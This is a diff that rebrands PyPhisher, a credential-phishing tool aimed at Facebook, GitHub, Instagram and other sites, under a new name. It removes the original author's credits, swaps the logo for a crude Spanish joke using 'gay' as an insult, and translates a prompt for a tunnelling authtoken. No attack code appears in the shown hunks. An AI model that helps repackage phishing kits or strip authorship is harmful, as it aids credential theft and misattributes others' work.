@@ -1,15 +1,10 @@
 # -*- coding: UTF-8 -*-
-# ToolName   : PyPhisher
-# Author     : KasRoudra
-# Version    : 2.1
+# ToolName   :  naitsabes
+# Author     : sebastian
+# Version    : 1.0
 # License    : MIT
-# Copyright  : KasRoudra (2021-2024)
-# Github     : https://github.com/KasRoudra
-# Gitlab     : https://gitlab.com/KasRoudra
-# Contact    : https://t.me/KasRoudra
-# Description: PyPhisher is a phishing tool in python
-# Tags       : Facebook Phishing, Github Phishing, Instagram Phishing and 70+ other sites available
-# 1st Commit : 08/08/2021
+# Copyright  : no hay bro, usala te amo jajaja
+# Description: herramienta hecha en python
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
@@ -19,7 +14,7 @@
 """
 MIT License
 
-Copyright (c) 2021-2024 KasRoudra
+Copyright (c) 2021-2024 Naitsabes
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -110,7 +105,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="2.1.8"
+version="1.0"
 
 # Regular Snippets
 ask  =     f"{green}[{white}?{green}] {yellow}"
@@ -123,14 +118,14 @@ info2  =   f"{green}[{white}•{green}] {purple}"
 
 # Modifying this could be potentially dangerous
 logo = f"""
-{red}  _____       _____  _     _     _               
-{cyan} |  __ \     |  __ \| |   (_)   | |              
-{yellow} | |__) |   _| |__) | |__  _ ___| |__   ___ _ __ 
-{blue} |  ___/ | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
-{red} | |   | |_| | |    | | | | \__ \ | | |  __/ |   
-{yellow} |_|    \__, |_|    |_| |_|_|___/_| |_|\___|_|   
-{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
-{cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
+{red}  ********************************************************              
+{cyan}       EL QUE LEA ESTO ES GAY, LIKE PARA DESGAY jajaja           
+{yellow}          No se que nombre ponerle... :( 
+{blue} 
+{red} 
+{red} ******************************************************  
+{green}         {" "*19}       {cyan}[v{version[:3]}]
+{cyan}          {" "*11}      {red}[by naitsabes...]
 """
 
 
@@ -824,7 +819,7 @@ def lx_token():
         status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
         if not "error" in status:
             break
-        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
+        has_token = input(f"\n{ask}Tienes el token de loclx bro ?, si es asi escribe y de lo contario n [y/N/help]: {green}")
         if has_token == "y":
             shell(f"{lx_command} account login")
             break
